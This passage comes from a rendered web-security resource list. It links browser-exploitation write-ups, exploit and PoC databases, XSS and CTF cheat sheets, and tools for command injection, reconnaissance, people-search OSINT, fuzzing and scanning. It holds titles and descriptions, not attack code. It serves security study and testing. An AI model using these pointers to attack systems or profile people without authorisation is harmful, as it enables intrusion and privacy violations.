Advantage of Out-of-Scope Domains in Bug Bounty Programs</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9BYmR1bGFoaHVzYW0=\">@Abdulahhusam</span>.</li>\n</ul>\n<h3 id=\"backend-core-of-browser-implementation-and-often-refers-to-c-or-c-part\"><a class=\"anchor\" href=\"#backend-core-of-browser-implementation-and-often-refers-to-c-or-c-part\">#</a> Backend (core of Browser implementation, and often refers to C or C++ part)</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWJyLmNvbS9lbi9jb21wYW55L2Ryd2ViL2Jsb2cvNDUyMDc2Lw==\">Breaking UC Browser</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZHJ3ZWIucnUv\">Доктор Веб</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5waHJhY2sub3JnL3BhcGVycy9hdHRhY2tpbmdfamF2YXNjcmlwdF9lbmdpbmVzLmh0bWw=\">Attacking JavaScript Engines - A case study of JavaScriptCore and CVE-2016-4622</span> - Written by <a href=\"phrack@saelo.net\">phrack@saelo.net</a>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2dzLjM2MC5jbi8zNjBzYWZlLzIwMTYvMTEvMjkvdGhyZWUtcm9hZHMtbGVhZC10by1yb21lLTIv\">Three roads lead to Rome</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ob2x5bm9w\">@holynop</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWxiZWNhZi5jb20vMjAxNy8wNS8yNC9leHBsb2l0aW5nLWEtdjgtb29iLXdyaXRlLw==\">Exploiting a V8 OOB write.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oYWxiZWNhZg==\">@halbecaf</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy5zZWN1cml0ZWFtLmNvbS9pbmRleC5waHAvYXJjaGl2ZXMvMzM3OQ==\">SSD Advisory – Chrome Turbofan Remote Code Execution</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy5zZWN1cml0ZWFtLmNvbS8=\">SecuriTeam Secure Disclosure (SSD)</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmJsdWVmcm9zdHNlY3VyaXR5LmRlL2ZpbGVzL0xvb2tfTW9tX0lfRG9udF9Vc2VfU2hlbGxjb2RlLVdQLnBkZg==\">Look Mom, I don't use Shellcode - Browser Exploitation Case Study for Internet Explorer 11</span> - Written by <span class=\"exturl\" data-url=\"aHR0cDovL3R3aXR0ZXIuY29tL21vcml0emo=\">@moritzj</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuemVyb2RheWluaXRpYXRpdmUuY29tL2Jsb2cvMjAxOC8yLzEyL3B1c2hpbmctd2Via2l0cy1idXR0b25zLXdpdGgtYS1tb2JpbGUtcHduMm93bi1leHBsb2l0\">PUSHING WEBKIT'S BUTTONS WITH A MOBILE PWN2OWN EXPLOIT</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS93YW5kZXJpbmdnbGl0Y2g=\">@wanderingglitch</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJldDIuaW8vMjAxOC8wNi8wNS9wd24yb3duLTIwMTgtZXhwbG9pdC1kZXZlbG9wbWVudC8=\">A Methodical Approach to Browser Exploitation</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJldDIuaW8v\">RET2 SYSTEMS, INC</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2FyLWUuZ2l0aHViLmlvL2Jsb2cvMjAxOC8wNy8xNC9jdmUtMjAxNy0yNDQ2LW9yLWpzY2pzZ2xvYmFsb2JqZWN0aXNoYXZpbmdhYmFkdGltZS8=\">CVE-2017-2446 or JSC::JSGlobalObject::isHavingABadTime.</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2FyLWUuZ2l0aHViLmlvLw==\">Diary of a reverse-engineer</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yMDM3MjEuaHRtbA==\">从一道 CTF 题零基础学 V8 漏洞利用</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXV0aG9yL3dhbGtlcmZ1eg==\">walkerfuz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90aGVvcmkuaW8vcmVzZWFyY2gvZXNjYXBpbmctY2hyb21lLXNhbmRib3g=\">CLEANLY ESCAPING THE CHROME SANDBOX</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS90amJlY2tlcl8=\">@tjbecker_</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnJldDIuaW8vMjAxOC8wNi8wNS9wd24yb3duLTIwMTgtZXhwbG9pdC1kZXZlbG9wbWVudC8=\">A Methodical Approach to Browser Exploitation</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9QYXRyaWNrQmllcm5hdA==\">@PatrickBiernat</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9nYWFzZWRlbGVu\">@gaasedelen</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9pdHN6bjEz\">@itszn13</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL2hlY2stdGhlLXBhY2tldC9ob3ctaS1nb3QtbXktZmlyc3QtYmlnLWJvdW50eS1wYXlvdXQtd2l0aC10ZXNsYS04ZDI4YjUyMDE2MmQ=\">How I got my first big bounty payout with Tesla</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9tZWRpdW0uY29tL0Bjai5mYWlyaGVhZA==\">@cj.fairhead</span>.</li>\n</ul>\n<h2 id=\"pocs\"><a class=\"anchor\" href=\"#pocs\">#</a> PoCs</h2>\n<p><a name=\"pocs-database\"></a></p>\n<h3 id=\"database\"><a class=\"anchor\" href=\"#database\">#</a> Database</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3R1bnovanMtdnVsbi1kYg==\">js-vuln-db</span> - Collection of JavaScript engine CVEs with PoCs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3R1bno=\">@tunz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ni9hd2Vzb21lLWN2ZS1wb2M=\">awesome-cve-poc</span> - Curated list of CVE PoCs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ng==\">@qazbnm456</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvZmZlZWhiL1NvbWUtUG9DLW9SLUV4UA==\">Some-PoC-oR-ExP</span> - 各种漏洞 poc、Exp 的收集或编写 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvZmZlZWhi\">@coffeehb</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01ldG5ldy91eHNzLWRi\">uxss-db</span> - Collection of UXSS CVEs with PoCs by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01ldG5ldw==\">@Metnew</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcGxvaXR1cy5jb20v\">SPLOITUS</span> - Exploits &amp; Tools Search Engine by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9pX2JvMG9t\">@i_bo0om</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20v\">Exploit Database</span> - ultimate archive of Exploits, Shellcode, and Security Papers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub2ZmZW5zaXZlLXNlY3VyaXR5LmNvbS8=\">Offensive Security</span>.</li>\n</ul>\n<h2 id=\"cheetsheets\"><a class=\"anchor\" href=\"#cheetsheets\">#</a> Cheetsheets</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNi1BLnBkZg==\">Security Geek 2016 - Part. A</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNi1CLnBkZg==\">Security Geek 2016 - Part. B</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNy1xMS5wZGY=\">Security Geek 2017 - Q1</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNy1xMi5wZGY=\">Security Geek 2017 - Q2</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9kb3dubG9hZC9ib29rL3NlY3VyaXR5LWdlZWstMjAxNy1xMy5wZGY=\">Security Geek 2017 - Q3</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGF0aWMuYW5xdWFua2UuY29tL2Rvd25sb2FkL2Ivc2VjdXJpdHktZ2Vlay0yMDE3LXE0LnBkZg==\">Security Geek 2017 - Q4</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWliby5jb20vMzYwYWRsYWI=\">360 网络攻防实验室</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sZWFucHViLmNvbS94c3M=\">XSS Cheat Sheet - 2018 Edition</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9icnV0ZWxvZ2lj\">@brutelogic</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3VwcHVzYWlraXJhbi9hd2Vzb21lLWN0Zi1jaGVhdHNoZWV0\">Capture the Flag CheatSheet</span> - Written by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3VwcHVzYWlraXJhbg==\">@uppusaikiran</span>.</li>\n</ul>\n<h2 id=\"tools\"><a class=\"anchor\" href=\"#tools\">#</a> Tools</h2>\n<p><a name=\"tools-auditing\"></a></p>\n<h3 id=\"auditing\"><a class=\"anchor\" href=\"#auditing\">#</a> Auditing</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FsZnJlc2NvL3Byb3dsZXI=\">prowler</span> - Tool for AWS security assessment, auditing and hardening by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FsZnJlc2Nv\">@Alfresco</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hlaG5vcGUvc2x1cnA=\">slurp</span> - Evaluate the security of S3 buckets by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hlaG5vcGU=\">@hehnope</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bC9hMnN2\">A2SV</span> - Auto Scanning to SSL Vulnerability by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bA==\">@hahwul</span>.</li>\n</ul>\n<p><a name=\"tools-command-injection\"></a></p>\n<h3 id=\"command-injection-2\"><a class=\"anchor\" href=\"#command-injection-2\">#</a> Command Injection</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvbW1peHByb2plY3QvY29tbWl4\">commix</span> - Automated All-in-One OS command injection and exploitation tool by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NvbW1peHByb2plY3Q=\">@commixproject</span>.</li>\n</ul>\n<p><a name=\"tools-reconnaissance\"></a></p>\n<h3 id=\"reconnaissance\"><a class=\"anchor\" href=\"#reconnaissance\">#</a> Reconnaissance</h3>\n<p><a name=\"tools-osint\"></a></p>\n<h4 id=\"osint-open-source-intelligence\"><a class=\"anchor\" href=\"#osint-open-source-intelligence\">#</a> OSINT - Open-Source Intelligence</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2hvZGFuLmlvLw==\">Shodan</span> - Shodan is the world's first search engine for Internet-connected devices by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9zaG9kYW5ocQ==\">@shodanhq</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jZW5zeXMuaW8v\">Censys</span> - Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet by <span class=\"exturl\" data-url=\"aHR0cHM6Ly91bWljaC5lZHUv\">University of Michigan</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly91cmxzY2FuLmlvLw==\">urlscan.io</span> - Service which analyses websites and the resources they request by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9oZWlwZWk=\">@heipei</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuem9vbWV5ZS5vcmcv\">ZoomEye</span> - ZoomEye 是一个针对网络空间的搜索引擎 by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS96b29tZXllX3RlYW0=\">@zoomeye_team</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb2ZhLnNvLw==\">FOFA</span> - 网络空间资产搜索引擎 by <span class=\"exturl\" data-url=\"aHR0cDovL2JhaW1hb2h1aS5uZXQv\">白帽汇</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9udGkubnNmb2N1cy5jb20v\">NSFOCUS</span> - THREAT INTELLIGENCE PORTAL by NSFOCUS GLOBAL.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9QaG90b24=\">Photon</span> - Incredibly fast crawler designed for OSINT by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3NoYWRhbi5jb20v\">傻蛋联网设备搜索</span> - 监测互联网基础设施安全威胁 by <span class=\"exturl\" data-url=\"aHR0cDovL3dlaWJvLmNvbS9zaGFkYW5zb3U=\">@傻蛋搜索</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VsZXZlblBhdGhzL0ZPQ0E=\">FOCA</span> - FOCA (Fingerprinting Organizations with Collected Archives) is a tool used mainly to find metadata and hidden information in the documents its scans by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZWxldmVucGF0aHMuY29tL2luZGV4Lmh0bWw=\">ElevenPaths</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5zcGlkZXJmb290Lm5ldC8=\">SpiderFoot</span> - Open source footprinting and intelligence-gathering tool by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9iaW5hcnlwb29s\">@binarypool</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxzb2NrZXQveHJheQ==\">xray</span> - XRay is a tool for recon, mapping and OSINT gathering from public networks by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2aWxzb2NrZXQ=\">@evilsocket</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbnJpa3Nlbi9HaXRyb2I=\">gitrob</span> - Reconnaissance tool for GitHub organizations by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbnJpa3Nlbg==\">@michenriksen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0ZlZWlDTi9HU0lM\">GSIL</span> - Github Sensitive Information Leakage（Github 敏感信息泄露）by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0ZlZWlDTg==\">@FeeiCN</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4MDlBTC9yYXZlbg==\">raven</span> - raven is a Linkedin information gathering tool that can be used by pentesters to gather information about an organization employees using Linkedin by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tLzB4MDlBTA==\">@0x09AL</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9SZWNvbkRvZw==\">ReconDog</span> - Reconnaissance Swiss Army Knife by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdg==\">@s0md3v</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zdGFydC5tZS9wL1FSRU5uTy9kYXRhYmFzZXM=\">Databases - start.me</span> - Various databases which you can use for your OSINT research by <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS90ZWNobmlzZXR0ZQ==\">@technisette</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wZW9wbGVmaW5kdGhvci5kay8=\">peoplefindThor</span> - the easy way to find people on Facebook by [postkassen](<span class=\"exturl\" data-url=\"bWFpbHRvOnBvc3RrYXNzZW5Ab2VqdmluZC5kaw==\">mailto:postkassen@oejvind.dk</span>?<span class=\"exturl\" data-url=\"aHR0cDovL3N1YmplY3Q9cGVvcGxlZmluZHRob3IuZGs=\">subject=peoplefindthor.dk</span> comments).</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZhZ3VpbGVyYWRpYXovdGluZm9sZWFr\">tinfoleak</span> - The most complete open-source tool for Twitter intelligence analysis by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZhZ3VpbGVyYWRpYXo=\">@vaguileradiaz</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2eWF0YXJtZWdlZC9SYWNjb29u\">Raccoon</span> - High performance offensive security tool for reconnaissance and vulnerability scanning by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2V2eWF0YXJtZWdlZA==\">@evyatarmeged</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NwaWRlckxhYnMvc29jaWFsX21hcHBlcg==\">Social Mapper</span> - Social Media Enumeration &amp; Correlation Tool by Jacob Wilkin(Greenwolf) by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NwaWRlckxhYnM=\">@SpiderLabs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VzcGkwbi9Eb2NrZXJmaWxlcw==\">espi0n/Dockerfiles</span> - Dockerfiles for various OSINT tools by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VzcGkwbg==\">@espi0n</span>.</li>\n</ul>\n<p><a name=\"tools-sub-domain-enumeration\"></a></p>\n<h4 id=\"sub-domain-enumeration-2\"><a class=\"anchor\" href=\"#sub-domain-enumeration-2\">#</a> Sub Domain Enumeration</h4>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xhL1N1Ymxpc3Qzcg==\">Sublist3r</span> - Sublist3r is a multi-threaded sub-domain enumeration tool for penetration testers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Fib3VsM2xh\">@aboul3la</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NocmlzVHJ1bmNlci9FeWVXaXRuZXNz\">EyeWitness</span> - EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NocmlzVHJ1bmNlcg==\">@ChrisTruncer</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==\">subDomainsBrute</span> - A simple and fast sub domain brute tool for pentesters by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpamllamll\">@lijiejie</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbnJpa3Nlbi9hcXVhdG9uZQ==\">AQUATONE</span> - Tool for Domain Flyovers by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pY2hlbnJpa3Nlbg==\">@michenriksen</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VsZHJhY28vZG9tYWluX2FuYWx5emVy\">domain_analyzer</span> - Analyze the security of any domain by finding all the information possible by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2VsZHJhY28=\">@eldraco</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZW4vZG9jdW1lbnRhdGlvbi9zZWFyY2hpbmcvI2dldHRpbmctZG9tYWluLWluZm9ybWF0aW9u\">VirusTotal domain information</span> - Searching for domain information by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20v\">VirusTotal</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9jZXJ0aWZpY2F0ZS10cmFuc3BhcmVuY3k=\">Certificate Transparency</span> - Google's Certificate Transparency project fixes several structural flaws in the SSL certificate system by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZQ==\">@google</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcnQuc2gv\">Certificate Search</span> - Enter an Identity (Domain Name, Organization Name, etc), a Certificate Fingerprint (SHA-1 or SHA-256) or a <span class=\"exturl\" data-url=\"aHR0cDovL2NydC5zaA==\">crt.sh</span> ID to search certificate(s) by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NydHNo\">@crtsh</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dlNXRlci9HU0RG\">GSDF</span> - Domain searcher named GoogleSSLdomainFinder by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dlNXRlcg==\">@We5ter</span>.</li>\n</ul>\n<p><a name=\"tools-code-generating\"></a></p>\n<h3 id=\"code-generating\"><a class=\"anchor\" href=\"#code-generating\">#</a> Code Generating</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ni9WV0dlbg==\">VWGen</span> - Vulnerable Web applications Generator by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3FhemJubTQ1Ng==\">@qazbnm456</span>.</li>\n</ul>\n<p><a name=\"tools-fuzzing\"></a></p>\n<h3 id=\"fuzzing\"><a class=\"anchor\" href=\"#fuzzing\">#</a> Fuzzing</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3htZW5kZXovd2Z1eno=\">wfuzz</span> - Web application bruteforcer by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3htZW5kZXo=\">@xmendez</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhY2stYWxsLXRoZS10aGluZ3MvY2hhcnNldGluc3BlY3Q=\">charsetinspect</span> - Script that inspects multi-byte character sets looking for characters with specific user-defined properties by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhY2stYWxsLXRoZS10aGluZ3M=\">@hack-all-the-things</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL09zYW5kYU1hbGl0aC9JUE9iZnVzY2F0b3I=\">IPObfuscator</span> - Simple tool to convert the IP to a DWORD IP by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL09zYW5kYU1hbGl0aA==\">@OsandaMalith</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZS9kb21hdG8=\">domato</span> - DOM fuzzer by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dvb2dsZQ==\">@google</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Z1enpkYi1wcm9qZWN0L2Z1enpkYg==\">FuzzDB</span> - Dictionary of attack patterns and primitives for black-box application fault injection and resource discovery.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05la21vL2Rpcmh1bnQ=\">dirhunt</span> - Web crawler optimized for searching and analyzing the directory structure of a site by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05la21v\">@nekmo</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3NsbGFicy5jb20vc3NsdGVzdC8=\">ssltest</span> - Online service that performs a deep analysis of the configuration of any SSL web server on the public internet. Provided by <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc3NsbGFicy5jb20=\">Qualys SSL Labs</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0JvMG9NL2Z1enoudHh0\">fuzz.txt</span> - Potentially dangerous files by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0JvMG9N\">@Bo0oM</span>.</li>\n</ul>\n<p><a name=\"tools-scanning\"></a></p>\n<h3 id=\"scanning\"><a class=\"anchor\" href=\"#scanning\">#</a> Scanning</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dwc2NhbnRlYW0vd3BzY2Fu\">wpscan</span> - WPScan is a black box WordPress vulnerability scanner by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dwc2NhbnRlYW0=\">@wpscanteam</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyZWdvODUvSm9vbWxhU2Nhbg==\">JoomlaScan</span> - Free software to find the components installed in Joomla CMS, built out of the ashes of Joomscan by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyZWdvODU=\">@drego85</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL200bGwway9XQVNjYW4=\">WAScan</span> - Is an open source web application security scanner that uses &quot;black-box&quot; method, created by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL200bGwwaw==\">@m4ll0k</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3ZlcnkvbnVjbGVp\">Nuclei</span> - Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Byb2plY3RkaXNjb3Zlcnk=\">@projectdiscovery</span>.</li>\n</ul>\n<p><a name=\"tools-penetration-testing\"></a></p>\n<h3 id=\"penetration-testing\"><a class=\"anchor\" href=\"#penetration-testing\">#</a> Penetration Testing</h3>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYnVycC8=\">Burp Suite</span> - Burp Suite is an integrated platform for performing security testing of web applications by <span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQv\">portswigger</span>.</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3RoZUluZmVjdGVkRHJha2UvVElEb1MtRnJhbWV3b3Jr\">TIDoS-Framework</span> - A comprehensive web application audit framework to cover up everything from Reconnaissance and OSINT to Vulnerability Analysis by <span class=\"exturl\" 